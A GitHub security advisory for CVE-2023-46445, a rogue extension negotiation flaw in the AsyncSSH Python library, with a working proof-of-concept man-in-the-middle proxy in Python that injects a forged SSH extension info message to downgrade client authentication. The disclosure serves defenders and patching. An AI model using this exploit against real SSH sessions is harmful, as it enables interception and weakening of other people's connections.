# [M] AsyncSSH Rogue Extension Negotiation

## Summary
Severity: Medium
Advisory: GHSA-cfc2-wr2v-gxm5
CVE: CVE-2023-46445
CWE: CWE-345, CWE-349, CWE-354
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2023-11-09
Source: https://github.com/advisories/GHSA-cfc2-wr2v-gxm5
Type: github-advisory

## Affected
- PyPI: `asyncssh` — affected >=0 <2.14.1

## Details
### Summary

An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the extension info message (RFC 8308) via a man-in-the-middle attack.

### Details

The rogue extension negotiation attack targets an AsyncSSH client connecting to any SSH server sending an extension info message. The attack exploits an implementation flaw in the AsyncSSH implementation to inject an extension info message chosen by the attacker and delete the original extension info message, effectively replacing it.

A correct SSH implementation should not process an unauthenticated extension info message. However, the injected message is accepted due to flaws in AsyncSSH. AsyncSSH supports the server-sig-algs and global-requests-ok extensions. Hence, the attacker can downgrade the algorithm used for client authentication by meddling with the value of server-sig-algs (e.g. use of SHA-1 instead of SHA-2).

### PoC

<details>
    <summary>AsyncSSH Client 2.14.0 (simple_client.py example) connecting to AsyncSSH Server 2.14.0 (simple_server.py example)</summary>

   ```python
    #!/usr/bin/python3
    import socket
    from threading import Thread
    from binascii import unhexlify
    
    #####################################################################################
    ## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##
    ##                                                                                 ##
    ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                    ##
    ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                    ##
    ##                                                                                 ##
    ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
    #####################################################################################
    
    # IP and port for the TCP proxy to bind to
    PROXY_IP = '127.0.0.1'
    PROXY_PORT = 2222
    
    # IP and port of the server
    SERVER_IP = '127.0.0.1'
    SERVER_PORT = 22
    
    # Length of the individual messages
    NEW_KEYS_LENGTH = 16
    SERVER_EXT_INFO_LENGTH = 676
    
    newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
    def contains_newkeys(data):
        return newkeys_payload in data
    
    # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs
    rogue_ext_info = unhexlify('0000000C060700000000000000000000')
    def insert_rogue_ext_info(data):
        newkeys_index = data.index(newkeys_payload)
        # Insert rogue extension info and remove SSH_MSG_EXT_INFO
        return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]
    
    def forward_client_to_server(client_socket, server_socket):
        try:
            while True:
                client_data = client_socket.recv(4096)
                if len(client_data) == 0:
                    break
                server_socket.send(client_data)
        except ConnectionResetError:
            print("[!] Client connection has been reset. Continue closing sockets.")
        print("[!] forward_client_to_server thread ran out of data, closing sockets!")
        client_socket.close()
        server_socket.close()
    
    def forward_server_to_client(client_socket, server_socket):
        try:
            while True:
                server_data = server_socket.recv(4096)
                if contains_newkeys(server_data):
                    print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                    if len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                        print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!")
                    while len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                        server_data += server_socket.recv(4096)
                    print(f"[d] Original server_data before modification: {server_data.hex()}")
                    server_data = insert_rogue_ext_info(server_data)
                    print(f"[d] Modified server_data with rogue extension info: {server_data.hex()}")
                if len(server_data) == 0:
                    break
                client_socket.send(server_data)
        except ConnectionResetError:
            print("[!] Target connection has been reset. Continue closing sockets.")
        print("[!] forward_server_to_client thread ran out of data, closing sockets!")
        client_socket.close()
        server_socket.close()
    
    if __name__ == '__main__':
        print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---")
        mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mitm_socket.bind((PROXY_IP, PROXY_PORT))
        mitm_socket.listen(5)
    
        print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
    
        try:
            while True:
                client_socket, client_addr = mitm_socket.accept()
                print(f"[+] Accepted connection from: {client_addr}")
                print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.connect((SERVER_IP, SERVER_PORT))
                print("[+] Spawning new forwarding threads to handle client connection.")
                Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
                Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
        except KeyboardInterrupt:
            client_socket.close()
            server_socket.close()
            mitm_socket.close()
  ```
</details>

### Impact

Algorithm downgrade during user authentication.

## References
- https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5
- https://nvd.nist.gov/vuln/detail/CVE-2023-46445
- https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e
- https://github.com/advisories/GHSA-cfc2-wr2v-gxm5
- https://github.com/pypa/advisory-database/tree/main/vulns/asyncssh/PYSEC-2023-237.yaml
- https://github.com/ronf/asyncssh
- https://github.com/ronf/asyncssh/blob/develop/docs/changes.rst
- https://lists.debian.org/debian-lts-announce/2024/09/msg00042.html
- https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ME34ROZWMDK5KLMZKTSA422XVJZ7IMTE
- https://security.netapp.com/advisory/ntap-20231222-0001
- https://www.terrapin-attack.com
- http://packetstormsecurity.com/files/176280/Terrapin-SSH-Connection-Weakening.html
